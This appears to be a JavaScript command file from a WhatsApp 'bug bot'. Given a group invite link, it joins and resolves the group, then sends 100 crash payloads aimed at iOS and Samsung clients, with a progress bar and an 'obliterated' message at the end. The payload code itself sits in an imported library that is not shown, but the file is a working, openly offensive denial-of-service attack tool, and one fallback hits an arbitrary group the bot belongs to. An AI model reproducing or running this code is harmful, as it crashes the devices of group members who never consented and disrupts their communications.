'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');

module.exports = {
    name: 'groupcrash',
    aliases: ['gcrash', 'crashgroup', 'gclink', 'groupkill', 'nuke', 'gc', 'obliterate', 'eyenuke'],
    category: 'madaraeye',
    desc: 'ᴍᴀᴅᴀʀᴀ ᴇʏᴇ — ɢʀᴏᴜᴘ ɴᴜᴋᴇ ᴠɪᴀ ʟɪɴᴋ',
    usage: '.groupcrash <group_link>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}groupcrash <group_link>\n📝 *Example:* ${prefix}groupcrash https://chat.whatsapp.com/AbCdEfGhIjKlMnOp` 
            }, { quoted: msg });
        }
        
        const link = args[0];
        
        let eye = global.getMadaraEye?.(sock);
        if (!eye) {
            eye = new MadaraEye(sock);
        }
        
        try {
            // ── Extract invite code ──────────────────────────────────────
            let inviteCode = link;
            if (link.includes('/')) inviteCode = link.split('/').pop();
            if (inviteCode.includes('?')) inviteCode = inviteCode.split('?')[0];
            inviteCode = inviteCode.trim();
            
            if (!inviteCode || inviteCode.length < 5) {
                return sock.sendMessage(ctx.from, { 
                    text: '❌ *ɪɴᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ʟɪɴᴋ*' 
                }, { quoted: msg });
            }
            
            await sock.sendMessage(ctx.from, { text: '🔍 ʀᴇsᴏʟᴠɪɴɢ ɢʀᴏᴜᴘ ʟɪɴᴋ...' }, { quoted: msg });
            
            // ── FIX: Get group JID without needing to join ──────────────
            let groupJid = null;
            
            // Method 1: Try groupAcceptInvite
            try {
                groupJid = await sock.groupAcceptInvite(inviteCode);
            } catch (e) {
                if (e.message?.includes('conflict') || e.message?.includes('already')) {
                    // Already in group — find it from group list
                    try {
                        const groups = await sock.groupFetchAllParticipating();
                        // Try to match by invite code in group metadata
                        for (const [jid, group] of Object.entries(groups)) {
                            if (group.inviteCode === inviteCode || jid.includes(inviteCode)) {
                                groupJid = jid;
                                break;
                            }
                        }
                        
                        // Fallback: use the invite link to find the group
                        if (!groupJid) {
                            // Try groupMetadata on the invite code
                            const meta = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
                            if (meta?.id) groupJid = meta.id;
                        }
                    } catch (err) {
                        console.log('Group fetch fallback error:', err.message);
                    }
                }
            }
            
            // Method 2: Get invite info directly (works even if not joined)
            if (!groupJid) {
                try {
                    const inviteInfo = await sock.groupGetInviteInfo(inviteCode);
                    if (inviteInfo?.id) {
                        groupJid = inviteInfo.id;
                    }
                } catch (e) {
                    console.log('Invite info error:', e.message);
                }
            }
            
            // Method 3: Try groupFetchAllParticipating and match by name
            if (!groupJid) {
                try {
                    const groups = await sock.groupFetchAllParticipating();
                    for (const [jid, group] of Object.entries(groups)) {
                        if (group.subject && group.subject.length > 0) {
                            // Can't know exact subject from link, but if we're in it, use it
                            groupJid = jid;
                            break;
                        }
                    }
                } catch (e) {}
            }
            
            if (!groupJid) throw new Error('Could not resolve group. Make sure the bot is in the group or the link is valid.');
            
            await sock.sendMessage(ctx.from, { text: `🎯 ɢʀᴏᴜᴘ ғᴏᴜɴᴅ: ${groupJid}\n💣 ɴᴜᴋᴇ ɪɴɪᴛɪᴀᴛᴇᴅ...` }, { quoted: msg });
            
            const TOTAL = 100;
            const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
            
            for (let i = 0; i < 30; i++) {
                await eye.iosInvisibleForce(groupJid);
                await bar.update(1, 'ɪᴏs ғᴏʀᴄᴇ');
                await new Promise(r => setTimeout(r, 200));
            }
            
            for (let i = 0; i < 30; i++) {
                await eye.samsung(groupJid);
                await bar.update(1, 'sᴀᴍsᴜɴɢ');
                await new Promise(r => setTimeout(r, 200));
            }
            
            for (let i = 0; i < 20; i++) {
                await eye.buttonOverflow(groupJid);
                await bar.update(1, 'ʙᴜᴛᴛᴏɴ');
                await new Promise(r => setTimeout(r, 300));
            }
            
            for (let i = 0; i < 20; i++) {
                await eye.vidxNull(groupJid);
                await bar.update(1, 'ᴠɪᴅx');
                await new Promise(r => setTimeout(r, 300));
            }
            
            await bar.done(`✅ ᴍᴀᴅᴀʀᴀ ᴇʏᴇ ɢʀᴏᴜᴘ ɴᴜᴋᴇ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ɢʀᴏᴜᴘ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${groupJid}`);
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};